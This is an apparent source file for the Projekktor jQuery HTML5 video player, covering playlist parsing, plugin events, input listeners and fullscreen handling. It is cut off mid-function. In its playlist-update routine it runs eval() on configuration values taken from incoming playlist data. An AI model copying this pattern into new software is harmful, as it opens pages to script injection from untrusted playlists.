jQuery(function($) {
var projekktors = [];

// apply IE8 html5 fix - thanx to Remy Sharp - http://remysharp.com/2009/01/07/html5-enabling-script/
if (!!document.createElement('video').canPlayType) {
    (function(){
	if(!/*@cc_on!@*/0) return;
	var e = "audio,video,track,source".split(',');
	for(var i=0;i<e.length;i++){document.createElement(e[i])}}
    )();
}

// this object is returned when multiple player's are requested
function Iterator(arr) {
    this.length = arr.length;
    this.each = function(fn) {$.each(arr, fn);};
    this.size = function() {return arr.length;};
};

// make sure projekktor works with jquery 1.3, 1.4, 1.5, 1.6:
if ($.prop==undefined || $().jquery < "1.6") {
    $.fn.prop = function(arga, argb) {
	return $(this).attr(arga, argb);
    }
}
projekktor = $p = function() {

    var arg = arguments[0],
	instances = [],
	plugins = [];

    if (!arguments.length) {
	return projekktors[0] || null;
    }

    // get instances
    // projekktor(idx:number);
    if (typeof arg == 'number') {
	return projekktors[arg];
    }

    // by string selection unqiue "id" or "*"
    if (typeof arg == 'string') {
	// get all instances
	if (arg == '*') {
	    return new Iterator(projekktors);
	}

	// get instance by Jquery OBJ, 'containerId' or selector
	for (var i=0; i<projekktors.length; i++) {
	    try {if (projekktors[i].getId() == arg.id) { instances.push(projekktors[i]); continue; } } catch(e){};
	    try {
		for (var j=0; j<$(arg).length; j++)
		{
		    if (projekktors[i].env.playerDom.get(0)==$(arg).get(j)) { instances.push(projekktors[i]); continue; }
		}
	    } catch(e){};
	    try {if (projekktors[i].getParent() == arg) { instances.push(projekktors[i]); continue; }} catch(e){};
	    try {if (projekktors[i].getId() == arg) { instances.push(projekktors[i]); continue; }} catch(e){};

	}
	if (instances.length>0)
	    return (instances.length==1) ? instances[0] : new Iterator(instances);
    }

    // build instances
    if (instances.length==0) {
	var cfg = arguments[1] || {};
	var callback = arguments[2] || {};
	if (typeof arg == 'string') {
		var count=0, playerA;
		$.each($(arg), function() {
		    playerA = new PPlayer($(this), cfg, callback);
		    projekktors.push(playerA);
		    count++;
		});
		return (count>1) ? new Iterator(projekktors) : playerA;
	// arg is a DOM element
	} else if (arg) {
	    projekktors.push(new PPlayer(arg, cfg, callback));
	    return new Iterator(projekktors);
	}
    }

    return null;

    function PPlayer(srcNode, cfg, onReady) {

	this.config = new projekktorConfig('1.2.30');

	this.env = {
	    muted: false,
	    playerDom: null,
	    mediaContainer: null,
	    agent: 'standard',
	    mouseIsOver: false,
	    loading: false,  // important
	    className: '',
	    onReady: onReady

	};

	this.media = [];
	this._plugins = [];
        this._pluginCache = {};
	this._queue = [];
	this._cuePoints = {};
	this.listeners = [];
	this.playerModel = {};
	this._isReady = false;
        this._maxElapsed = 0;
	this._currentItem = null;
	this._playlistServer = '';
	this._id = '';


	/* apply incoming playlistdata  */
	this._reelUpdate = function(obj) {

	    this.env.loading = true;

	    var ref = this,
                data = obj || [{}];

	    this.media = [];

	    // gather and set alternate config from reel:
	    try {
		
                for(var props in data.config) {
		    if (typeof data.config[props].indexOf('objectfunction')>-1) continue; // IE SUCKZ
		    this.config[props] = eval( data.config[props] );
		}
                
		if (data.config!=null) {
		    $p.utils.log('Updated config var: '+props+' to '+this.config[props]);
		    this._promote('configModified');
                    delete(data.config);
		}
                
	    } catch(e) {}
       

	    // add media items
	    var files = data.playlist || data;
                
	    for(var item in files) {
                
		if (typeof files[item]=='function' || typeof files[item]==null)
                    continue;

		if (files[item]) {
		    var itemIdx = this._addItem(this._prepareMedia({file:files[item], config:files[item].config || {}, errorCode: files[item].errorCode}));
		}
		
		// set cuepoints from reel:
		$.each(files[item].cuepoints || [], function() {
		    this.item = itemIdx;                    
		    ref.setCuePoint(this);	    
		})
		
	    }

            if (itemIdx==null)
                this._addItem(this._prepareMedia({file:'', config:{}, errorCode: 97}));

	    this.env.loading = false;
	    this._promote('scheduled', this.getItemCount());
	    this._syncPlugins(function(){ref.setActiveItem(0);})
	};


	this._addItem = function(data, idx, replace) {
	    var resultIdx = 0;
	    
	    // replace "error dummy" if any:
	    if (this.media.length===1 && this.media[0].mediaModel=='NA') {
		this._detachplayerModel();
		this.media = [];
	    }

	    // inject or append:
	    if (idx===undefined || idx<0 || idx>this.media.length-1) {
		this.media.push(data);
		resultIdx = this.media.length-1;
	    } else {
		this.media.splice(idx, (replace===true) ? 1 : 0,data);
		resultIdx = idx;
	    }

	    // report schedule modifications after initial scheduling only:
	    if (this.env.loading===false)
		this._promote('scheduleModified', this.getItemCount());

	    return resultIdx;
	};

	this._removeItem = function(idx) {
	    var resultIdx = 0;

	    if (this.media.length===1) {
		// keep "error dummy", nothing to do:
		if (this.media[0].mediaModel=='NA') {
		    return 0;
		} else {
		    // replace last one with "error dummy"
		    this.media[0] = this._prepareMedia({file:''});
		    return 0;
		}
	    }


	    if (idx===undefined || idx<0 || idx>this.media.length-1) {
		this.media.pop();
		resultIdx = this.media.length;
	    }
	    else {
		this.media.splice(idx, 1);
		resultIdx = idx;
	    }

	    if (this.env.loading===false)
		this._promote('scheduleModified', this.getItemCount());

	    return resultIdx;
	};

	/* apply available data and playout models */
	this._prepareMedia = function(data) {

	    var ref = this,
                mediaFiles = [],
		qualities = [],
		extTypes = {},
		typesModels = {},
		priority = [],
		modelSets = [],
		result = {},
                extRegEx = [];

	    // build regex string and filter dublicate extensions and more ...	    
	    for(var i in $p.mmap ) {

                platforms = (typeof $p.mmap[i]['platform']=='object') ? $p.mmap[i]['platform'] : [ $p.mmap[i]['platform'] ];
            
                $.each(platforms, function(_na, platform) {
 
// !!!!!
                    if ( !ref._canPlay($p.mmap[i].type, platform, data.config.streamType) )
                        return true;                    

                    // set priority level
                    $p.mmap[i].level = $.inArray(platform, ref.config._platforms);
                    $p.mmap[i].level = ($p.mmap[i].level<0) ? 100 : $p.mmap[i].level;

                    extRegEx.push( '.'+$p.mmap [i].ext );
    
                    if (!extTypes[$p.mmap[i].ext])
                        extTypes[$p.mmap[i].ext] = new Array();
    
                    extTypes[$p.mmap[i].ext].push( $p.mmap[i] );
    
    
                    if (!typesModels[$p.mmap[i].type])
                        typesModels[$p.mmap[i].type] = new Array();
    
                    typesModels[$p.mmap[i].type].push( $p.mmap[i] );

                });
	    }

	    extRegEx = '^.*\.('+extRegEx.join('|')+")$";

	    // incoming file is a string only, no array
	    if (typeof data.file=='string') {
		data.file = [{'src':data.file}];
		if (typeof data.type=='string') {
		    data.file = [{'src':data.file, 'type':data.type}];
		}
	    }

	    // incoming file is ... bullshit
	    if ($.isEmptyObject(data) || data.file===false || data.file === null) {
		data.file = [{'src':null}];
	    }

	    for(var index in data.file) {

		// mÃ¶Ã¶Ã¶Ã¶p
		if (index=='config') continue;

		// just a filename _> go object
		if (typeof data.file[index]=='string') {
		    data.file[index] = {'src':data.file[index]};
		}


		// nothing to do, next one
		if (data.file[index].src==null) {
		    continue;
		}

 		// get file extension:
		/**
		try {
		    data.file[index].ext = data.file[index].src.match( new RegExp(extRegEx))[1];
		    data.file[index].ext = (!data.file[index].ext) ? 'NaN' : data.file[index].ext.replace('.','');
		} catch(e) { data.file[index].ext='NaN'; }
		*/

		// if type is set, get rid of the codec mess
		if ( data.file[index].type!=null && data.file[index].type!=='') {
		    try {
			var codecMatch = data.file[index].type.split(' ').join('').split(/[\;]codecs=.([a-zA-Z0-9\,]*)[\'|\"]/i);
			
                        if (codecMatch[1]!==undefined) {
			    data.file[index].codec = codecMatch[1];
			    data.file[index].type = codecMatch[0].replace(/x-/, '');
			}
		    } catch(e){}


		}
		else {
		    data.file[index].type = this._getTypeFromFileExtension( data.file[index].src );
		}
                

                var possibleTypes = $.merge(typesModels[data.file[index].type] || [], typesModels[data.file[index].type.replace(/x-/, '')] || [] );

                if (possibleTypes.length>0) {                                
                    possibleTypes.sort(function(a, b) {
                            return a.level - b.level;
                    });                               
                    modelSets.push(possibleTypes[0]);
                }
                

	    }
            
	    if (modelSets.length==0)
		modelSets = typesModels['none/none'];
	    else {
		// find highest priorized playback model
		modelSets.sort(function(a, b) {
		    return a.level - b.level;
		});

		var bestMatch = modelSets[0].level;		
		modelSets = $.grep(modelSets, function(value) {
		    return value.level == bestMatch;;
	        });
	    }

	    var types = [];
	    $.each(modelSets || [], function() {
		types.push(this.type);
	    })
            
    
            var modelSet = (modelSets && modelSets.length>0) ? modelSets[0] : {type:'none/none', model: 'NA', errorCode:11};
         
	    types = $p.utils.unique(types);

	    for (var index in data.file) {
		
		// discard files not matching the selected model
                if (data.file[index].type==null)
                    continue;
                
		if ( ($.inArray( data.file[index].type.replace(/x-/, ''), types)<0) && modelSet.type!='none/none')
		    continue;
		
		// make srcURL absolute	for non-RTMP files
		data.file[index].src = (!$.isEmptyObject(data.config) && (data.config.streamType=='http' || data.config.streamType==null) )
		    ? $p.utils.toAbsoluteURL(data.file[index].src)
		    : data.file[index].src;
		
    		// 
		
		// set "default" quality
		if ( data.file[index].quality==null)
		    data.file[index].quality = 'default';
		    
		// add this files quality key to index
		qualities.push(data.file[index].quality)
	
		// add media variant
		mediaFiles.push(data.file[index])		

	    }         
  	  
	    // check quality index against configured index:
	    var _setQual = [];
	    $.each(this.getConfig('playbackQualities'), function() {
		_setQual.push(this.key || 'default');
	    });
            
	    result = {
		ID: data.config.id || $p.utils.randomId(8),
		cat: data.config.cat || 'clip',
		file: mediaFiles,
		platform: modelSet.platform,
		qualities: $p.utils.intersect($p.utils.unique(_setQual), $p.utils.unique(qualities)),
		mediaModel: modelSet.model || 'NA', 
		errorCode: modelSet.errorCode || data.errorCode || 7,   
		config:  data.config || {}	           	
	    }	    
	    return result;
	};

	/* media element update listener */
	this._modelUpdateListener = function(type, value) {
	    var ref = this;

	    if (!this.playerModel.init) return;
	    if (type!='time' && type!='progress') {
		$p.utils.log("Update: '"+type, this.playerModel.getSrc(), this.playerModel.getModelName(), value);
	    }

	    switch(type) {
		case 'state':
		    
                    this._promote('state', value); // IMPORTANT: STATES must be promoted first!
                    
                    var classes = $.map(this.getDC().attr("class").split(" "), function(item) {
                        return item.indexOf(ref.getConfig('ns') + "state") === -1 ? item : "";
                    });                    
                    classes.push(this.getConfig('ns') + "state" + value.toLowerCase() );
                    this.getDC().attr("class", classes.join(" "));
                                        
		    switch (value) {

			case 'AWAKENING':
			    var modelRef = this.playerModel;
			    this._syncPlugins(function() {
				if (modelRef.getState('AWAKENING'))
				    modelRef.displayItem(true);
			    });
			    break;

			case 'ERROR':
			    this._addGUIListeners();
			    this._promote('error', {});
			    break;

			case 'STOPPED':
			    this._promote('stopped', {});
			    break;

			case 'PAUSED':
			    if (this.getConfig('disablePause')===true) {
				this.playerModel.applyCommand('play', 0);
			    }
			    break;

			case 'COMPLETED':                           
			    // all items in PL completed:
			    if (this._currentItem+1>=this.media.length && !this.getConfig('loop')) {
				this.setFullscreen(false);            
				this._promote('done', {});
			    }
			    // next one, pls:
			    this.setActiveItem('next');
			    break;
		    }
		    break;

		case 'modelReady':
		    this._maxElapsed = 0;
		    this._promote('item', ref._currentItem);
		    break;

		case 'displayReady':
		    this._promote('displayReady', true);
		    var modelRef = this.playerModel;
		    this._syncPlugins(function() {
			ref._promote('ready');
			ref._addGUIListeners();
			if (!modelRef.getState('IDLE'))
			    modelRef.start();
		    });

		    break;

		case 'qualityChange':
		    this.setConfig({playbackQuality: value});		    
		    this._promote('qualityChange', value);
		    break;
                
                /*
                case 'durationChange':
                    console.log( this.getConfig('start')>0, this.playerModel.allowRandomSeek )
                    if (this.playerModel.allowRandomSeek==true) {
                        if (this.getConfig('start')>0) {
                            console.log("setPLay")
                            this.setPlayhead(this.getConfig('start'));
                            this.setConfig({start: 0});
                        }
                    }
                    console.log( this.getConfig('start') )
                    break;
                */
                
		case 'volume':
		    this.setConfig({volume: value});
		    this._promote('volume', value);

		    if (value<=0) {
			this.env.muted = true;
			this._promote('mute', value);
		    } else if (this.env.muted ==true) {
			this.env.muted = false;
			this._promote('unmute', value);
		    }
		    break;

		case 'playlist':
		    this.setFile(value.file, value.type);
		    break;

		case 'config':
		    this.setConfig(value);
		    break;
            
                case 'time':
                    // track quartiles
                    if (this._maxElapsed<value) {
                        var pct = Math.round(value * 100 / this.getDuration()),
                            evt=false;
                        
                        if (pct < 25) {pct=25;}
                        if (pct > 25 && pct < 50) {evt='firstquartile'; pct=50;}
                        if (pct > 50 && pct < 75) {evt='midpoint'; pct=75;}
                        if (pct > 75 && pct < 100) {evt='thirdquartile'; pct=100;}
                        
                        if (evt!=false) this._promote(evt, value);
                        this._maxElapsed = (this.getDuration() * pct / 100);
                    }

		default:                    
		    this._promote(type, value);
		    break;                
	    }

	};

	this._syncPlugins = function(callback) {
	    // wait for all plugins to re-initialize properly
	    var ref = this;
	    
	    this.env.loading = true;
	    (function() {
		try{
		    if (ref._plugins.length>0) {
			for(var i=0; i<ref._plugins.length; i++) {
			    if (!ref._plugins[i].isReady()) {
				setTimeout(arguments.callee,50);
				return;
			    }
			}
		    }
                    
		    ref.env.loading = false;
		    ref._promote('pluginsReady', {});
                    
		    try {callback();}catch(e){}
                    
		} catch(e) {}
	    })();
	};

	this._MD = function(event) {
	    projekktor('#'+event.currentTarget.id.replace(/_media$/,''))._playerFocusListener(event);
	};

	/* attach mouse-listeners to GUI elements */
	this._addGUIListeners = function() {
	    var ref = this;
	    
	    this._removeGUIListeners();

	    if (this.getDC().get(0).addEventListener)
		this.getDC().get(0).addEventListener("mousedown", this._MD, true);
	    else
		// IE
		this.getDC().mousedown(function(event){ref._playerFocusListener(event);});

	    this.getDC()
		.mousemove(function(event){ref._playerFocusListener(event);})
		.mouseenter(function(event){ref._playerFocusListener(event);})
		.mouseleave(function(event){ref._playerFocusListener(event);})
                .focus(function(event){ref._playerFocusListener(event);})
                .blur(function(event){ref._playerFocusListener(event);})
		// .bind('touchstart', function(){ref._MD})
		
	    $(window)
		.bind('resize.projekktor'+this.getId(), function() {ref.setSize();})
		.bind('touchstart', function(){ref._windowTouchListener(event);});

	    // keyboard interface get rid of this moz.warning
	    if (this.config.enableKeyboard===true) {
		    $(document).unbind('keydown.pp'+this._id);
		    $(document).bind('keydown.pp'+this._id, function(evt){
			ref._keyListener(evt);
		    });
	    }
	    
	};

	/* remove mouse-listeners */
	this._removeGUIListeners = function() {
	    $("#"+this.getId()).unbind();
	    this.getDC().unbind();

	    if (this.getDC().get(0).removeEventListener) {
		this.getDC().get(0).removeEventListener("mousedown", this._MD, true);
	    }
	    else {
		this.getDC().get(0).detachEvent('onmousedown', this._MD);
	    }

	    $(window).unbind('resize.projekktor'+this.getId());
	};

	/* add plugin objects to the bubble-event queue */
	this._registerPlugins = function() {
	    var plugins = $.merge($.merge([],this.config._plugins), this.config._addplugins),
		pluginName = '',
		pluginObj = null;

	    // nothing to do / we donÂ´t do this twice
	    if (this._plugins.length>0 || plugins.length==0) return;	    
	    for(var i=0; i<plugins.length; i++) {

		pluginName = "projekktor"+plugins[i].charAt(0).toUpperCase() + plugins[i].slice(1);
		try {typeof eval(pluginName);} catch(e) {continue;}

		pluginObj = $.extend(true, {}, new projekktorPluginInterface(), eval(pluginName).prototype);
		pluginObj.name = plugins[i].toLowerCase();
		pluginObj.pp = this;
		pluginObj.playerDom = this.env.playerDom;
		pluginObj._init( this.config['plugin_'+plugins[i].toLowerCase()] || {} );

                if (this.config['plugin_'+pluginObj.name]==null)
                    this.config['plugin_'+pluginObj.name] = {};
                this.config['plugin_'+pluginObj.name] = $.extend(true, {}, pluginObj.config || {});
                
                for (var propName in pluginObj) {
                    if (propName.indexOf('Handler')>1) {
                        if (this._pluginCache[propName]==null) {
                            this._pluginCache[propName]=[];
                        }
                        this._pluginCache[propName].push(pluginObj);
                    }
                }
                
		this._plugins.push(pluginObj);
	    }
	};

	/* removes some or all eventlisteners from registered plugins */
	this.removePlugins = function(rmvPl) {
	    if (this._plugins.length==0) return;

	    var pluginsToRemove = rmvPl || $.merge($.merge([],this.config._plugins), this.config._addplugins),
		pluginsRegistered = this._plugins.length;

	    for (var j=0; j<pluginsToRemove.length; j++){
		for (var k=0; k<pluginsRegistered; k++){
		    if (this._plugins[k]!=undefined) {
			if (this._plugins[k].name==pluginsToRemove[j].toLowerCase()) {
			    this._plugins[k].deconstruct();
			    this._plugins.splice(k, 1);
                          
                            for (var events in this._pluginCache){
                                for (var shortcuts=0; shortcuts<this._pluginCache[events].length; shortcuts++){
                                    if (this._pluginCache[events][shortcuts].name==pluginsToRemove[j].toLowerCase()){
                                        this._pluginCache[events].splice(shortcuts, 1);
                                    }
                                }
                            }
			}
		    }
		}
	    }

	};

	/* promote an event to all registered plugins */
	this._promote = function(evt, value) {

	    var event = evt,
		pluginData={};

	    if (typeof event=='object') {		
		if (!event._plugin) return;
		event = 'plugin_' + event._plugin + $p.utils.capitalise(event._event.toUpperCase());
	    }

	    if (event!='time' && event!='progress' && event!='mousemove') 
		$p.utils.log("Event: ["+event+"]", value, this.listeners);

	    // fire on plugins
	    if (this._pluginCache[event+"Handler"] && this._pluginCache[event+"Handler"].length>0) {

		for (var i = 0; i < this._pluginCache[event+"Handler"].length; i++) {                    
                    this._pluginCache[event+"Handler"][i][event+"Handler"](value, this);
                }

	    }

            if (this._pluginCache["eventHandler"] && this._pluginCache["eventHandler"].length>0) {
		for (var i = 0; i < this._pluginCache["eventHandler"].length; i++) {       
                    this._pluginCache["eventHandler"][i]["eventHandler"](event, value, this);
                }
            }
            
	    // fire on custom (3rd party) listeners
	    if (this.listeners.length>0) {
		for (var i = 0; i < this.listeners.length; i++) {
                    if ( this.listeners[i]['event']==event || this.listeners[i]['event']=='*' ) {
                        this.listeners[i]['callback'](value, this);
                    }
		}
	    }
	};

	/* destoy, reset, break down to rebuild */
	this._detachplayerModel = function() {
	    this._removeGUIListeners();

	    try {
		this.playerModel.destroy();
		this._promote('detach', {});
	    } catch(e) {
		// this.playerModel = new playerModel();
		// this.playerModel._init({pp:this, autoplay: false});
	    }
	};


	/*******************************
	      GUI LISTENERS
	*******************************/
	this._windowTouchListener = function(evt) {
	    if (evt.touches) {
		if (evt.touches.length>0) {
		    if (  ( $(document.elementFromPoint(evt.touches[0].clientX, evt.touches[0].clientY)).attr('id') || '').indexOf(this.getDC().attr('id'))>-1) {
			if (this.env.mouseIsOver==false)
			    this._promote('mouseenter', {});			    
			this.env.mouseIsOver = true;
			this._promote('mousemove', {});
			evt.stopPropagation();			
		    } else if (this.env.mouseIsOver) {
			this._promote('mouseleave', {});			
			this.env.mouseIsOver = false;
		    }                   
		}
	    }
	};
        
        
        this._playerFocusListener = function(evt) {
            var type = evt.type.toLowerCase();
                       
            switch(type) {
                case 'mousedown':
                    if (this.env.mouseIsOver==false)
                        break;
            
                    // make sure we donÂ´t mess with input-overlays here:
                    if ( "|TEXTAREA|INPUT".indexOf('|' + evt.target.tagName.toUpperCase()) > -1){		
                        return;
                    }
                    
                    // prevent context-menu
                    if (evt.which==3) {
                        if ($(evt.target).hasClass('context')) break;
                        $(document).bind('contextmenu', function(evt){
                            $(document).unbind('contextmenu');
                            return false;
                        });                    
                    }
                    break;
                
                case 'mousemove':
                    if (this.env.mouseX!=evt.clientX && this.env.mouseY!=evt.clientY) {
                        this.env.mouseIsOver = true;
                    }
                    // prevent strange chrome issues with cursor changes:
                    if (this.env.clientX==evt.clientX && this.env.clientY==evt.clientY)
                        return;
                    this.env.clientX = evt.clientX;
                    this.env.clientY = evt.clientY;
                    break;
                
                case 'focus':
                case 'mouseenter':
                    this.env.mouseIsOver = true;
                    break;
                
                case 'blur':
                case 'mouseleave':
                    this.env.mouseIsOver = false;
                    break;
            }
            
            this._promote(type, evt);
            
        };

	this._keyListener = function(evt) {
            
	    if (!this.env.mouseIsOver) return;
            
            // make sure we donÂ´t mess with input-overlays here:
	    if ( "|TEXTAREA|INPUT".indexOf('|' + evt.target.tagName.toUpperCase()) > -1){		
		return;
	    }             
	    
            var ref = this,
                set = (this.getConfig('keys').length > 0)
                    ? this.getConfig('keys')
                    : [{
                        27: function(player) {player.setStop();}, // ESC
                        32: function(player, evt) {player.setPlayPause(); evt.preventDefault();},
                        70: function(player) {player.setFullscreen();}, // f
                        39: function(player, evt) {player.setPlayhead('+5'); evt.preventDefault();},
                        37: function(player, evt) {player.setPlayhead('-5'); evt.preventDefault();},
                        38: function(player, evt) {player.setVolume('+0.05'); evt.preventDefault();},
                        40: function(player, evt) {player.setVolume('-0.05'); evt.preventDefault();},
                        68: function(player) {player.setDebug();}, // D
                        67: function(player) {$p.utils.log('Config Dump', player.config);}, // C
                        80: function(player) {$p.utils.log('Schedule Dump', player.media);}, // P
                        84: function(player) {$p.utils.log('Cuepoints Dump', player.getCuePoints());} // T
                    }];
            
            this._promote('key', evt);

            $.each(  set || [], function() {
                try {this[evt.keyCode](ref, evt);} catch(e) {}
                try {this['*'](ref);} catch(e) {}
            })
	};

	/*****************************************
	    DOM Manipulations
	*****************************************/
	/* make player fill the whole window viewport */
	this._enterFullViewport = function(forcePlayer, addClass) {

	    // get relevant elements
	    var win = this.getIframeWindow() || $(window),
		target = this.getIframe() || this.getDC(),
                overflow = $(win[0].document.body).css('overflow');

	    if (forcePlayer) {
		win = $(window);
		target = this.getDC();
	    }
            
	    // remember relevant attributes
            target.data('fsdata', {
                scrollTop: win.scrollTop() || 0,
                scrollLeft: win.scrollLeft() || 0,
                targetStyle: target.attr('style') || '',
                bodyOverflow:(overflow=='visible') ? 'auto' : overflow, // prevent IE7 crash
                bodyOverflowX:$(win[0].document.body).css('overflow-x'), // prevent IE7 crash
                bodyOverflowY:$(win[0].document.body).css('overflow-y'), // prevent IE7 crash
                iframeWidth: target.attr('width') || 0,
                iframeHeight: target.attr('height') || 0
            })

	    // prepare parent window
	    win.scrollTop(0).scrollLeft(0);
	    $(win[0].document.body).css({
                overflow: 'hidden',
                overflowX: 'hidden',
                overflowY: 'hidden'
            });

	    // prepare player
	    target.css({
		position: 'fixed',
		display: 'block',
		top: 0,
		left: 0,
		width: '100%',
		height: '100%',
		zIndex: 99999,
		margin: 0,
		padding: 0
	    });            
	    
	    // target.parent().css('overflow', 'hidden');
	    // prepare player
	    /*
	    target.css({
		position: 'relative',
		display: 'block',
		top: -target.offset().top + "px",
		left: -target.offset().left + "px",
		width: win.widht() + "px",
		height: win.height() + "px",
		zIndex: 9999,
		margin: 0,
		padding: 0
	    });       	    
	    */
	    
            if (addClass!==false)
                this.getDC().addClass('fullscreen');

	    return target;
	};

	/* reset player from "full (parent) window viewport" iframe thing */
	this._exitFullViewport = function(forcePlayer) {

	    // get relevant elements
	    var win = this.getIframeWindow() || $(window),
		target = this.getIframe() || this.getDC(),
                fsData = target.data('fsdata') || null;

	    if (forcePlayer) {
		win = $(window);
		target = this.getDC();
	    }

	    // reset
            if (fsData!=null) {
                win.scrollTop(fsData.scrollTop).scrollLeft(fsData.scrollLeft);
                $(win[0].document.body).css('overflow', fsData.bodyOverflow);
                $(win[0].document.body).css('overflow-x', fsData.bodyOverflowX);
                $(win[0].document.body).css('overflow-y', fsData.bodyOverflowY);                
                if ( fsData.iframeWidth > 0 && !forcePlayer) {
                    target.attr('width',fsData.iframeWidth+"px");
                    target.attr('height', fsData.iframeHeight+"px");
                }
                target
                    .attr('style', (fsData.targetStyle==null) ? '' : fsData.targetStyle );
		target.data('fsdata', null);
            }
            
            this.getDC().removeClass('fullscreen');

	    return (this.getIframe()) ? parent.window.document : document;
	};


	/*******************************
	plugin API wrapper
	*******************************/
	this.pluginAPI = function() {
	    var args = Array.prototype.slice.call(arguments) || null,
		dest = args.shift(),
		func = args.shift();
		
	    if (dest!=null && func!=null) {
		for (var j=0; j<this._plugins.length; j++){
		    if (this._plugins[j].name==dest) {
			this._plugins[j][func](args[0])
			break;
		    }
		}
	    }
	};


	/*******************************
	public (API) methods GETTERS
	*******************************/
        this.getPlayerVer = function() {
            return this.config._version;
        };
	
	this.getIsLastItem = function() {
	    return ( (this._currentItem==this.media.length-1) && this.config._loop!==true )
	};

	this.getIsFirstItem = function() {
	    return ( (this._currentItem==0) && this.config._loop!==true )
	};	
	
	// compatibility <0.9.x
	this.getItemConfig = function(name, itemIdx) {
	    return this.getConfig(name, itemIdx);
	};

	this.getConfig = function(name, itemIdx) {
	    var idx = itemIdx || this._currentItem,
		result = this.config['_'+name] || this.config[name];
           
	    // get value from item-specific config (beats them all)
	    if (this.config['_'+name]==undefined) {
		
		try {
		    if (this.media[idx]['config'][name]!==undefined) {
			result = this.media[idx]['config'][name];			
		    }
		} catch(e){}
	    }

	    if (name.indexOf('plugin_')>-1) {
		try {
		    if (this.media[idx]['config'][name]) {
			result = $.extend(true, {}, this.config[name], this.media[idx]['config'][name]);
		    }
		} catch(e){}
	    }
	
	    if (result==null)
		return null;
	    
            if (typeof result == 'object' && result.length === null) {
                result = $.extend(true, {}, result || {});
            }
            else if (typeof result == 'object') {
                result = $.extend(true, [], result || []);            
            }
            
            if (typeof result == 'string') {
                switch(result) {
                    case 'true':
                        result = true;
                        break;
                    case 'false':
                        result = false;
                        break;
                    case 'NaN':
                    case 'undefined':
                    case 'null':
                        result = null;
                        break;
                }
            }

	    return result;
	};
        
	this.getDC = function() {
	    return this.env.playerDom;
	};

	this.getState = function(compare) {
	    var result = 'IDLE';
	    
	    try {result =  this.playerModel.getState();}
	    catch(e) {result==null}

	    if (compare!=null) return (result==compare.toUpperCase());
	    return result;
	};

	this.getLoadProgress = function() {
	    try {return this.playerModel.getLoadProgress();}
	    catch(e) {return 0;}
	};

	this.getKbPerSec = function() {
	    try {return this.playerModel.getKbPerSec();}
	    catch(e) {return 0;}
	};

	this.getItemCount = function() {
            // ignore NA dummy
            return (this.media.length==1 && this.media[0].mediaModel=='na') ? 0 : this.media.length;
	};
    
	this.getItemId = function(idx) {
	    return this.media[idx || this._currentItem].ID || null;
	};

	this.getItemIdx = function() {
	    return this._currentItem;
	};

	this.getPlaylist = function() {
	    return this.getItem('*');
	};
        
	this.getItem = function() {
            // ignore NA dummy
            if (this.media.length==1 && this.media[0].mediaModel=='na') {
                return [];
            }
            // some shortcuts    
	    switch(arguments[0] || 'current') {
		case 'next':
		    return $.extend(true, [], this.media[this._currentItem+1]);
		case 'prev':
		    return $.extend(true, [], this.media[this._currentItem-1]);
		case 'current':
		    return $.extend(true, [], this.media[this._currentItem]);
		case '*':
		    return $.extend(true, [], this.media);
		default:
		    return $.extend(true, [], this.media[arguments[0] || this._currentItem]);
	    }
	};
        
	this.getVolume = function() {
	    return (this.getConfig('fixedVolume')===true)
		? this.config.volume
		: this.getConfig('volume');
	};

	this.getTrackId = function() {
	    if (this.getConfig('trackId')) {
		return this.config.trackId;
	    }
	    if (this._playlistServer!=null) {
		return "pl"+this._currentItem;
	    }
	    return null;
	};

	this.getLoadPlaybackProgress = function() {
	    try {return this.playerModel.getLoadPlaybackProgress()}
	    catch(e) {return 0;}
	};
	
	this.getSource = function() {	    
	    try {return this.playerModel.getSource()[0].src;}
	    catch(e) {return false;}
	};	

	this.getDuration = function() {
	    try {return this.playerModel.getDuration();}
	    catch(e) {return 0;}
	};

	this.getPosition = function() {
	    try {return this.playerModel.getPosition() || 0;}
	    catch(e) {return 0;}
	};
        
	this.getMaxPosition = function() {
	    try {return this.playerModel.getMaxPosition() || 0;}
	    catch(e) {return 0;}
	};
        
	this.getFrame = function() {
	    try {return this.playerModel.getFrame() }
	    catch(e) {return 0;}
	};        

	this.getTimeLeft = function() {
	    try {return this.playerModel.getDuration() - this.playerModel.getPosition();}
	    catch(e) {return this.media[this._currentItem].duration;}
	};

	this.getInFullscreen = function() {
	    return this.getNativeFullscreenSupport().isFullScreen();
	}

	this.getMediaContainer = function() {
	    // return "buffered" media container
	    if (this.env.mediaContainer==null) {
		this.env.mediaContainer = $('#'+this.getMediaId());
	    }
	    // if mediacontainer does not exist ...
	    if (this.env.mediaContainer.length==0) {
		// and thereÂ´s a "display", injectz media container
		if ( this.env.playerDom.find('.'+this.getNS()+'display').length>0 ) {
		    this.env.mediaContainer = $(document.createElement('div'))
			.attr({'id':this.getId()+"_media"}) // IMPORTANT IDENTIFIER
			.css({
			   // position: 'absolute',
			    overflow: 'hidden',
			    height: '100%',
			    width: '100%',
			    top: 0,
			    left: 0,
			    padding: 0,
			    margin: 0,
			    display: 'block'
			})
			.appendTo( this.env.playerDom.find('.'+this.getNS()+'display') );
		}

		// elsewise create a 1x1 pixel dummy somewhere
		else {
		    this.env.mediaContainer = $(document.createElement('div'))
			.attr({id: this.getMediaId()})
			.css({width: '1px', height: '1px'})
			.appendTo( $(document.body) );
		}

	    }

	    // go for it
	    return this.env.mediaContainer;
	};

	this.getMediaId = function() {
	    return this.getId()+"_media";
	};

	this.getMediaType = function() {
            // might be called before a model has been initialized
            try {
                return this._getTypeFromFileExtension( this.playerModel.getSrc() ) || 'na/na';
            } catch(e) {
                return 'na/na';
            }
	};

	this.getUsesFlash = function() {
	    return (this.playerModel.modelId.indexOf('FLASH')>-1)
	};

	this.getModel = function() {
	    try {return this.media[this._currentItem].mediaModel.toUpperCase()} catch(e) {return "NA";}
	};

	this.getIframeWindow = function() {
	    try {
		var result = parent.location.host || false;
		return (result===false) ? false : $(parent.window );
	    } catch(e) { return false; }
	};

	this.getIframe = function() {
	    try {
		var result = window.$(frameElement) || [];
		return (result.length==0) ? false : result;
	    } catch(e) { return false; }
	};


	this.getPlaybackQuality = function() {
            var result = 'default';
            try { result=this.playerModel.getPlaybackQuality();} catch(e) {}
            if (result=='default') result = this.getConfig('playbackQuality');
            if (result=='default' || $.inArray(result, this.getPlaybackQualities())==-1 ) result = this.getAppropriateQuality();
            if ($.inArray(result, this.getPlaybackQualities())==-1) result = 'default';
	    return result;
	};
	
	this.getPlaybackQualities = function() {
	    try {
                return $.extend(true, [], this.media[this._currentItem].qualities || []);;
            } catch(e) {return []; }
	};	

	this.getIsMobileClient = function(what) {
